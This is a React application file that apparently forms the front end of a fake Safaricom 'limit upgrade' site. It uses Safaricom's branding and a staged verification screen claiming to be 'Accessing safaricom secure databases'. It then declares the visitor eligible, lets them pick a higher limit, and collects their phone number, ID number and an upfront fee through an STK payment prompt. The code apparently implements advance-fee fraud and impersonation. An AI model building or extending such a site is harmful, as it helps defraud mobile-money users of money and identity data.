import React from "react";
import { useState, useEffect } from 'react';
import { SAFARICOM_GREEN } from './utils/constants';
import { useVerification } from './hooks/useVerification';
import { usePayment } from './hooks/usePayment';
import SupportBar from './components/SupportBar';
import SystemStatusBar from './components/SystemStatusBar';
import ZuriChatWidget from './components/ZuriChatWidget';
import Toast from './components/Toast';
import LandingPage from './components/LandingPage';
import VerificationStep from './components/VerificationStep';
import ResultStep from './components/ResultStep';
import LimitSelection from './components/LimitSelection';
import PaymentModal from './components/PaymentModal';
import UserFeedback from './components/UserFeedback';
import FAQ from './components/FAQ';
import Footer from './components/Footer';


function App() {
  const [currentPage, setCurrentPage] = useState('landing');
  const [showToast, setShowToast] = useState(false);
  const [toastMessage, setToastMessage] = useState('');
  const [hasReachedFinalStep, setHasReachedFinalStep] = useState(false);
  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);

  const {
    verificationState,
    selectedLimit,
    selectedFee,
    startVerification,
    selectLimit,
    getCurrentStatus,
  } = useVerification();

  const {
    paymentState,
    paymentBusy,
    initiatePayment,
    checkPaymentNow,
    closePayment,
  } = usePayment();

  // Handle verification flow
  const handleStartVerification = (phone) => {
    const success = startVerification(phone);
    if (success) {
      setCurrentPage('verifying');
    }
  };

  // Move to result step when verification completes
  useEffect(() => {
    if (verificationState.isEligible && !verificationState.isVerifying) {
      setCurrentPage('result');
      showToastNotification(`${verificationState.phoneNumber} is eligible!`);
    }
  }, [verificationState]);

  // Handle proceed from result to limit selection
  const handleProceedToSelection = () => {
    setCurrentPage('main');
    showToastNotification('Select your new limit');
  };

  // Handle limit selection and open payment modal
  const handleSelectLimit = (limit, fee) => {
    selectLimit(limit, fee);
  };

  // Open payment modal
  const openPaymentModal = () => {
    if (!selectedLimit) {
      showToastNotification('Please select a limit first');
      return;
    }
    setIsPaymentModalOpen(true);
  };

  // Handle payment initiation
  const handleInitiatePayment = async (phone, amount, idNumber) => {
    try {
      await initiatePayment(phone, amount, idNumber);
      showToastNotification('STK push sent! Check your phone.');
    } catch (error) {
      showToastNotification(error.message || 'Payment failed');
    }
  };

  // Handle payment check
  const handleCheckPayment = async () => {
    try {
      await checkPaymentNow();
      if (paymentState.status === 'completed') {
        setHasReachedFinalStep(true);
        showToastNotification('Payment successful!');
      }
    } catch (error) {
      showToastNotification(error.message || 'Error checking payment');
    }
  };

  // Close payment modal
  const closePaymentModal = () => {
    closePayment();
    setIsPaymentModalOpen(false);
  };

  // Show toast notification
  const showToastNotification = (message) => {
    setToastMessage(message);
    setShowToast(true);
    setTimeout(() => setShowToast(false), 5000);
  };

  // Toggle chat
  const toggleChat = () => {
    if (hasReachedFinalStep) {
      if (window.Tawk_API) {
        window.Tawk_API.toggle();
      }
    }
  };

  // Load Tawk.to script
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://embed.tawk.to/69ff04487b29e11c3321d049/default';
    script.async = true;
    script.charset = 'UTF-8';
    script.setAttribute('crossorigin', '*');
    document.body.appendChild(script);

    window.Tawk_API = window.Tawk_API || {};
    window.Tawk_API.onLoad = function() {
      window.Tawk_API.hideWidget();
    };

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  // Determine which page to show
  const renderPage = () => {
    switch (currentPage) {
      case 'verifying':
        return (
          <VerificationStep
            statusText={getCurrentStatus()}
            subStatusText="Accessing safaricom secure databases..."
          />
        );
      case 'result':
        return (
          <ResultStep
            phoneNumber={verificationState.phoneNumber}
            onProceed={handleProceedToSelection}
          />
        );
      case 'main':
        return (
          <>
            <LimitSelection
              onSelect={handleSelectLimit}
              selectedLimit={selectedLimit}
            />
            {selectedLimit && (
              <button
                onClick={openPaymentModal}
                className="fixed bottom-20 left-1/2 transform -translate-x-1/2 w-[90%] max-w-md bg-safaricom text-white font-bold py-4 rounded-2xl shadow-xl transition-all uppercase tracking-wider text-sm cursor-pointer hover:bg-green-700"
                style={{ backgroundColor: SAFARICOM_GREEN }}
              >
                Upgrade to Ksh {selectedLimit.toLocaleString()}
              </button>
            )}
            <UserFeedback />
            <FAQ />
            <Footer />
          </>
        );
      default:
        return (
          <>
            <LandingPage onStartVerification={handleStartVerification} />
            <UserFeedback />
            <FAQ />
            <Footer />
          </>
        );
    }
  };

  return (
    
    <div className="min-h-screen bg-slate-50">
      {/* Support Bar */}
      <SupportBar onChatClick={toggleChat} />

      {/* System Status Bar */}
      <SystemStatusBar />

      {/* Main Content */}
      <main>{renderPage()}</main>

      {/* Toast Notification */}
      {showToast && (
        <Toast
          message={toastMessage}
          onClose={() => setShowToast(false)}
        />
      )}

      {/* Payment Modal */}
      <PaymentModal
        isOpen={isPaymentModalOpen}
        onClose={closePaymentModal}
        onInitiatePayment={handleInitiatePayment}
        onCheckPayment={handleCheckPayment}
        paymentState={paymentState}
        selectedLimit={selectedLimit}
        selectedFee={selectedFee}
      />

      {/* Zuri Chat Widget */}
      <ZuriChatWidget
        hasReachedFinalStep={hasReachedFinalStep}
        currentPage={currentPage}
      />
    </div>
    
  );
}

export default App;